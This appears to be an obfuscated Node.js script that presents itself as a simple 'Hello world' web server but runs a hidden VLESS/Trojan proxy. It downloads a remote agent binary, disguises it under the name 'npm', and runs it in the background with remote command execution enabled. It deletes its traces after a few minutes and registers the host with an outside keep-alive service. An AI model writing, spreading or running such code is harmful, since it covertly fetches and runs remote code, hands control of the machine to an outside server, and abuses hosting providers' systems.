function _0x3b19(_0x2e7372,_0x2ba810){_0x2e7372=_0x2e7372-0x198;const _0x2ef769=_0x2ef7();let _0x3b194b=_0x2ef769[_0x2e7372];return _0x3b194b;}const _0x2c9517=_0x3b19;(function(_0xb5f224,_0x46c7be){const _0x139327=_0x3b19,_0x4cf434=_0xb5f224();while(!![]){try{const _0x26b58f=parseInt(_0x139327(0x1f9))/0x1+-parseInt(_0x139327(0x1b0))/0x2+-parseInt(_0x139327(0x19f))/0x3*(-parseInt(_0x139327(0x1b8))/0x4)+parseInt(_0x139327(0x1ea))/0x5+parseInt(_0x139327(0x1cb))/0x6*(parseInt(_0x139327(0x1ae))/0x7)+parseInt(_0x139327(0x1ed))/0x8*(parseInt(_0x139327(0x1d5))/0x9)+parseInt(_0x139327(0x1b1))/0xa*(-parseInt(_0x139327(0x20e))/0xb);if(_0x26b58f===_0x46c7be)break;else _0x4cf434['push'](_0x4cf434['shift']());}catch(_0x3db1d0){_0x4cf434['push'](_0x4cf434['shift']());}}}(_0x2ef7,0xe97eb));const os=require('os'),http=require(_0x2c9517(0x1cd)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x2c9517(0x1f3)),crypto=require(_0x2c9517(0x209)),{Buffer}=require(_0x2c9517(0x1d4)),{exec,execSync}=require(_0x2c9517(0x1a9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2c9517(0x1ce)][_0x2c9517(0x20a)]||_0x2c9517(0x1e3),NEZHA_SERVER=process[_0x2c9517(0x1ce)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2c9517(0x1ce)][_0x2c9517(0x1db)]||'',NEZHA_KEY=process[_0x2c9517(0x1ce)][_0x2c9517(0x1cf)]||'',DOMAIN=process[_0x2c9517(0x1ce)][_0x2c9517(0x1ba)]||'1234.abc.com',AUTO_ACCESS=process[_0x2c9517(0x1ce)][_0x2c9517(0x1d1)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x2c9517(0x1ee)]||_0x2c9517(0x1df),NAME=process[_0x2c9517(0x1ce)][_0x2c9517(0x1e5)]||_0x2c9517(0x1e7),PORT=process[_0x2c9517(0x1ce)][_0x2c9517(0x1fb)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x58fa55=_0x2c9517;try{const _0x2c1e12=await axios[_0x58fa55(0x1dd)](_0x58fa55(0x19b)),_0x357a73=_0x2c1e12[_0x58fa55(0x201)];ISP=(_0x357a73[_0x58fa55(0x1bd)]+'-'+_0x357a73[_0x58fa55(0x1bf)])['replace'](/ /g,'_');}catch(_0x12dbc7){ISP=_0x58fa55(0x1d0);}};GetISP();function _0x2ef7(){const _0x370066=['includes','http','env','NEZHA_KEY','Unknown','AUTO_ACCESS','stream','then','buffer','1791SYbexZ','utf8','443','https://amd64.ssss.nyc.mn/v1','writeFileSync',':443?encryption=none&security=tls&sni=','NEZHA_PORT','toString','get','readUInt16BE','sub','index.html','hex','write','5efabea4-f6d5-91fd-b8f0-17e004c89c60','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','finish','Hug','https://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','3763685MunTId','from','setsid\x20nohup\x20./npm\x20-s\x20','9752ZYjycq','SUB_PATH','\x20-p\x20','unlink','map','/bin/bash','path','every','base64','https://arm64.ssss.nyc.mn/v1','send','2096','876772lIFeQe','false','PORT','listen','trim','Hello\x20world!','https://amd64.ssss.nyc.mn/agent','text/html','data','catch','pipe','type','\x20with\x20all\x20DNS\x20servers','readUInt8','connection','--tls','crypto','UUID','&path=%2F','substr','connect','8059007wLDfkD','trojan://','true','slice','config.yaml','https://speed.cloudflare.com/meta','reduce','utf-8','readFile','51kiAiRh','writeHead','npm\x20download\x20successfully','client_secret:\x20',':443?security=tls&sni=','Not\x20Found\x0a','log','https://oooo.serv00.net/add-url','end','vless://','child_process','arm64','npm','close','url','31738aTHKlM','2083','3112882AARmqV','10qVCLhn','1.1.1.1','once','&fp=chrome&type=ws&host=','&type=A','Answer','2053','316748QmCbnm','Automatic\x20Access\x20Task\x20added\x20successfully','DOMAIN','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','error','country','test','asOrganization','concat','post','pop','length','join','update','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','https://dns.google/resolve?name=','digest','Server','36UoTWbz'];_0x2ef7=function(){return _0x370066;};return _0x2ef7();}const httpServer=http['createServer']((_0x37ea95,_0x4d3bbd)=>{const _0xc63ae9=_0x2c9517;if(_0x37ea95['url']==='/'){const _0x124e54=path[_0xc63ae9(0x1c4)](__dirname,_0xc63ae9(0x1e0));fs[_0xc63ae9(0x19e)](_0x124e54,_0xc63ae9(0x1d6),(_0x532e4a,_0x2abc3f)=>{const _0x3950bd=_0xc63ae9;if(_0x532e4a){_0x4d3bbd[_0x3950bd(0x1a0)](0xc8,{'Content-Type':_0x3950bd(0x200)}),_0x4d3bbd['end'](_0x3950bd(0x1fe));return;}_0x4d3bbd[_0x3950bd(0x1a0)](0xc8,{'Content-Type':_0x3950bd(0x200)}),_0x4d3bbd[_0x3950bd(0x1a7)](_0x2abc3f);});return;}else{if(_0x37ea95[_0xc63ae9(0x1ad)]==='/'+SUB_PATH){const _0x3bef97=_0xc63ae9(0x1a8)+UUID+'@'+DOMAIN+_0xc63ae9(0x1da)+DOMAIN+_0xc63ae9(0x1b4)+DOMAIN+_0xc63ae9(0x20b)+WSPATH+'#'+NAME+'-'+ISP,_0xa3193c=_0xc63ae9(0x20f)+UUID+'@'+DOMAIN+_0xc63ae9(0x1a3)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xc63ae9(0x20b)+WSPATH+'#'+NAME+'-'+ISP,_0x5a8b37=_0x3bef97+'\x0a'+_0xa3193c,_0x45e41f=Buffer[_0xc63ae9(0x1eb)](_0x5a8b37)[_0xc63ae9(0x1dc)](_0xc63ae9(0x1f5));_0x4d3bbd['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x4d3bbd[_0xc63ae9(0x1a7)](_0x45e41f+'\x0a');}else _0x4d3bbd[_0xc63ae9(0x1a0)](0x194,{'Content-Type':'text/plain'}),_0x4d3bbd[_0xc63ae9(0x1a7)](_0xc63ae9(0x1a4));}}),wss=new WebSocket[(_0x2c9517(0x1ca))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x2c9517(0x1b2)];function resolveHost(_0x50eb48){return new Promise((_0x3026b7,_0x4be8d8)=>{const _0x1748ee=_0x3b19;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1748ee(0x1be)](_0x50eb48)){_0x3026b7(_0x50eb48);return;}let _0x306c3d=0x0;function _0x53dbbd(){const _0x1f0acd=_0x1748ee;if(_0x306c3d>=DNS_SERVERS[_0x1f0acd(0x1c3)]){_0x4be8d8(new Error('Failed\x20to\x20resolve\x20'+_0x50eb48+_0x1f0acd(0x205)));return;}const _0x37a745=DNS_SERVERS[_0x306c3d];_0x306c3d++;const _0x10418f=_0x1f0acd(0x1c8)+encodeURIComponent(_0x50eb48)+_0x1f0acd(0x1b5);axios[_0x1f0acd(0x1dd)](_0x10418f,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x1f0acd(0x1d3)](_0x453a82=>{const _0x4442a3=_0x1f0acd,_0x54c1f9=_0x453a82[_0x4442a3(0x201)];if(_0x54c1f9['Status']===0x0&&_0x54c1f9['Answer']&&_0x54c1f9[_0x4442a3(0x1b6)][_0x4442a3(0x1c3)]>0x0){const _0x395287=_0x54c1f9[_0x4442a3(0x1b6)]['find'](_0x4165d8=>_0x4165d8[_0x4442a3(0x204)]===0x1);if(_0x395287){_0x3026b7(_0x395287[_0x4442a3(0x201)]);return;}}_0x53dbbd();})['catch'](_0x252776=>{_0x53dbbd();});}_0x53dbbd();});}function handleVlessConnection(_0xb30ec2,_0x1feccf){const _0x208bb3=_0x2c9517,[_0x228914]=_0x1feccf,_0x32e394=_0x1feccf[_0x208bb3(0x199)](0x1,0x11);if(!_0x32e394[_0x208bb3(0x1f4)]((_0xaea29b,_0x392381)=>_0xaea29b==parseInt(uuid[_0x208bb3(0x20c)](_0x392381*0x2,0x2),0x10)))return![];let _0x288ab2=_0x1feccf[_0x208bb3(0x199)](0x11,0x12)[_0x208bb3(0x206)]()+0x13;const _0x329826=_0x1feccf[_0x208bb3(0x199)](_0x288ab2,_0x288ab2+=0x2)[_0x208bb3(0x1de)](0x0),_0x1286da=_0x1feccf[_0x208bb3(0x199)](_0x288ab2,_0x288ab2+=0x1)[_0x208bb3(0x206)](),_0x2ddc1c=_0x1286da==0x1?_0x1feccf[_0x208bb3(0x199)](_0x288ab2,_0x288ab2+=0x4)[_0x208bb3(0x1c4)]('.'):_0x1286da==0x2?new TextDecoder()['decode'](_0x1feccf[_0x208bb3(0x199)](_0x288ab2+0x1,_0x288ab2+=0x1+_0x1feccf[_0x208bb3(0x199)](_0x288ab2,_0x288ab2+0x1)[_0x208bb3(0x206)]())):_0x1286da==0x3?_0x1feccf[_0x208bb3(0x199)](_0x288ab2,_0x288ab2+=0x10)[_0x208bb3(0x19c)]((_0x982736,_0x289b03,_0x32f3c1,_0x237dec)=>_0x32f3c1%0x2?_0x982736['concat'](_0x237dec[_0x208bb3(0x199)](_0x32f3c1-0x1,_0x32f3c1+0x1)):_0x982736,[])[_0x208bb3(0x1f1)](_0x216f1c=>_0x216f1c[_0x208bb3(0x1de)](0x0)[_0x208bb3(0x1dc)](0x10))['join'](':'):'';_0xb30ec2[_0x208bb3(0x1f7)](new Uint8Array([_0x228914,0x0]));const _0x213de7=createWebSocketStream(_0xb30ec2);return resolveHost(_0x2ddc1c)[_0x208bb3(0x1d3)](_0xaf9584=>{const _0x20d4b7=_0x208bb3;net['connect']({'host':_0xaf9584,'port':_0x329826},function(){const _0x16ae95=_0x3b19;this[_0x16ae95(0x1e2)](_0x1feccf[_0x16ae95(0x199)](_0x288ab2)),_0x213de7['on'](_0x16ae95(0x1bc),()=>{})['pipe'](this)['on'](_0x16ae95(0x1bc),()=>{})[_0x16ae95(0x203)](_0x213de7);})['on'](_0x20d4b7(0x1bc),()=>{});})['catch'](_0x59219b=>{const _0x323889=_0x208bb3;net[_0x323889(0x20d)]({'host':_0x2ddc1c,'port':_0x329826},function(){const _0x3462e0=_0x323889;this[_0x3462e0(0x1e2)](_0x1feccf[_0x3462e0(0x199)](_0x288ab2)),_0x213de7['on'](_0x3462e0(0x1bc),()=>{})[_0x3462e0(0x203)](this)['on'](_0x3462e0(0x1bc),()=>{})['pipe'](_0x213de7);})['on'](_0x323889(0x1bc),()=>{});}),!![];}function handleTrojanConnection(_0x4f186f,_0x535f24){const _0x284c13=_0x2c9517;try{if(_0x535f24[_0x284c13(0x1c3)]<0x3a)return![];const _0x57aba4=_0x535f24['slice'](0x0,0x38)[_0x284c13(0x1dc)](),_0x494431=[UUID];let _0x1c1277=null;for(const _0x527758 of _0x494431){const _0xd63dad=crypto['createHash']('sha224')[_0x284c13(0x1c5)](_0x527758)[_0x284c13(0x1c9)](_0x284c13(0x1e1));if(_0xd63dad===_0x57aba4){_0x1c1277=_0x527758;break;}}if(!_0x1c1277)return![];let _0x4faebb=0x38;_0x535f24[_0x4faebb]===0xd&&_0x535f24[_0x4faebb+0x1]===0xa&&(_0x4faebb+=0x2);const _0x31261a=_0x535f24[_0x4faebb];if(_0x31261a!==0x1)return![];_0x4faebb+=0x1;const _0x22a3d1=_0x535f24[_0x4faebb];_0x4faebb+=0x1;let _0x24786c,_0x247c12;if(_0x22a3d1===0x1)_0x24786c=_0x535f24[_0x284c13(0x199)](_0x4faebb,_0x4faebb+0x4)[_0x284c13(0x1c4)]('.'),_0x4faebb+=0x4;else{if(_0x22a3d1===0x3){const _0x14c240=_0x535f24[_0x4faebb];_0x4faebb+=0x1,_0x24786c=_0x535f24['slice'](_0x4faebb,_0x4faebb+_0x14c240)[_0x284c13(0x1dc)](),_0x4faebb+=_0x14c240;}else{if(_0x22a3d1===0x4)_0x24786c=_0x535f24[_0x284c13(0x199)](_0x4faebb,_0x4faebb+0x10)[_0x284c13(0x19c)]((_0x4b383f,_0x1ba2ab,_0x4d737a,_0x570199)=>_0x4d737a%0x2?_0x4b383f[_0x284c13(0x1c0)](_0x570199['slice'](_0x4d737a-0x1,_0x4d737a+0x1)):_0x4b383f,[])[_0x284c13(0x1f1)](_0x542a58=>_0x542a58[_0x284c13(0x1de)](0x0)[_0x284c13(0x1dc)](0x10))['join'](':'),_0x4faebb+=0x10;else return![];}}_0x247c12=_0x535f24[_0x284c13(0x1de)](_0x4faebb),_0x4faebb+=0x2;_0x4faebb<_0x535f24[_0x284c13(0x1c3)]&&_0x535f24[_0x4faebb]===0xd&&_0x535f24[_0x4faebb+0x1]===0xa&&(_0x4faebb+=0x2);const _0x1fdcaa=createWebSocketStream(_0x4f186f);return resolveHost(_0x24786c)[_0x284c13(0x1d3)](_0x566196=>{const _0x5bb2f1=_0x284c13;net['connect']({'host':_0x566196,'port':_0x247c12},function(){const _0x25a129=_0x3b19;_0x4faebb<_0x535f24['length']&&this['write'](_0x535f24[_0x25a129(0x199)](_0x4faebb)),_0x1fdcaa['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x25a129(0x203)](_0x1fdcaa);})['on'](_0x5bb2f1(0x1bc),()=>{});})[_0x284c13(0x202)](_0x40e5a8=>{const _0x59c12b=_0x284c13;net[_0x59c12b(0x20d)]({'host':_0x24786c,'port':_0x247c12},function(){const _0x16ca9c=_0x59c12b;_0x4faebb<_0x535f24[_0x16ca9c(0x1c3)]&&this[_0x16ca9c(0x1e2)](_0x535f24[_0x16ca9c(0x199)](_0x4faebb)),_0x1fdcaa['on'](_0x16ca9c(0x1bc),()=>{})[_0x16ca9c(0x203)](this)['on'](_0x16ca9c(0x1bc),()=>{})[_0x16ca9c(0x203)](_0x1fdcaa);})['on']('error',()=>{});}),!![];}catch(_0x4c682a){return![];}}wss['on'](_0x2c9517(0x207),(_0x26f067,_0x5b79ad)=>{const _0x57fb60=_0x2c9517,_0x4eebe7=_0x5b79ad[_0x57fb60(0x1ad)]||'';_0x26f067[_0x57fb60(0x1b3)]('message',_0x2dff57=>{const _0x41b4ab=_0x57fb60;if(_0x2dff57[_0x41b4ab(0x1c3)]>0x11&&_0x2dff57[0x0]===0x0){const _0x374f91=_0x2dff57['slice'](0x1,0x11),_0x354d7d=_0x374f91['every']((_0x432717,_0x5886a9)=>_0x432717==parseInt(uuid[_0x41b4ab(0x20c)](_0x5886a9*0x2,0x2),0x10));if(_0x354d7d){!handleVlessConnection(_0x26f067,_0x2dff57)&&_0x26f067[_0x41b4ab(0x1ac)]();return;}}!handleTrojanConnection(_0x26f067,_0x2dff57)&&_0x26f067[_0x41b4ab(0x1ac)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3e93c1=_0x2c9517,_0x330123=os['arch']();return _0x330123==='arm'||_0x330123===_0x3e93c1(0x1aa)||_0x330123===_0x3e93c1(0x1c7)?!NEZHA_PORT?_0x3e93c1(0x1f6):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x3e93c1(0x1d8):_0x3e93c1(0x1ff);},downloadFile=async()=>{const _0x3ce41d=_0x2c9517;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5db91b=getDownloadUrl(),_0x1c70b8=await axios({'method':_0x3ce41d(0x1dd),'url':_0x5db91b,'responseType':_0x3ce41d(0x1d2)}),_0x2f7bc0=fs['createWriteStream'](_0x3ce41d(0x1ab));return _0x1c70b8[_0x3ce41d(0x201)][_0x3ce41d(0x203)](_0x2f7bc0),new Promise((_0xc13bc3,_0x1fd067)=>{const _0x1ea02f=_0x3ce41d;_0x2f7bc0['on'](_0x1ea02f(0x1e6),()=>{const _0x44eeaf=_0x1ea02f;console['log'](_0x44eeaf(0x1a1)),exec('chmod\x20+x\x20npm',_0x28589c=>{if(_0x28589c)_0x1fd067(_0x28589c);_0xc13bc3();});}),_0x2f7bc0['on']('error',_0x1fd067);});}catch(_0x2ee2f1){throw _0x2ee2f1;}},runnz=async()=>{const _0x42ea22=_0x2c9517;try{const _0x23dd80=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x42ea22(0x19d)});if(_0x23dd80[_0x42ea22(0x1fd)]()!==''){console[_0x42ea22(0x1a5)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x231bf1){}await downloadFile();let _0x5adf5e='',_0x5af2f9=[_0x42ea22(0x1d7),'8443',_0x42ea22(0x1f8),'2087',_0x42ea22(0x1af),_0x42ea22(0x1b7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2809e7=_0x5af2f9[_0x42ea22(0x1cc)](NEZHA_PORT)?_0x42ea22(0x208):'';_0x5adf5e=_0x42ea22(0x1ec)+NEZHA_SERVER+':'+NEZHA_PORT+_0x42ea22(0x1ef)+NEZHA_KEY+'\x20'+_0x2809e7+_0x42ea22(0x1e4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x46f265=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x42ea22(0x1c2)]():'',_0x805652=_0x5af2f9[_0x42ea22(0x1cc)](_0x46f265)?_0x42ea22(0x198):_0x42ea22(0x1fa),_0x346be4=_0x42ea22(0x1a2)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x42ea22(0x1c6)+_0x805652+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x42ea22(0x1d9)](_0x42ea22(0x19a),_0x346be4);}_0x5adf5e=_0x42ea22(0x1e9);}else{console['log'](_0x42ea22(0x1bb));return;}}try{exec(_0x5adf5e,{'shell':_0x42ea22(0x1f2)},_0x28e8bf=>{const _0x64903c=_0x42ea22;if(_0x28e8bf)console[_0x64903c(0x1bc)]('npm\x20running\x20error:',_0x28e8bf);else console[_0x64903c(0x1a5)]('npm\x20is\x20running');});}catch(_0xecdb46){console[_0x42ea22(0x1bc)]('error:\x20'+_0xecdb46);}};async function addAccessTask(){const _0x59ca16=_0x2c9517;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x141069=_0x59ca16(0x1e8)+DOMAIN;try{const _0xa00df3=await axios[_0x59ca16(0x1c1)](_0x59ca16(0x1a6),{'url':_0x141069},{'headers':{'Content-Type':'application/json'}});console[_0x59ca16(0x1a5)](_0x59ca16(0x1b9));}catch(_0x528373){}}const delFiles=()=>{const _0x5c4a7a=_0x2c9517;fs[_0x5c4a7a(0x1f0)](_0x5c4a7a(0x1ab),()=>{}),fs[_0x5c4a7a(0x1f0)](_0x5c4a7a(0x19a),()=>{});};httpServer[_0x2c9517(0x1fc)](PORT,()=>{const _0x43964f=_0x2c9517;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x43964f(0x1a5)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
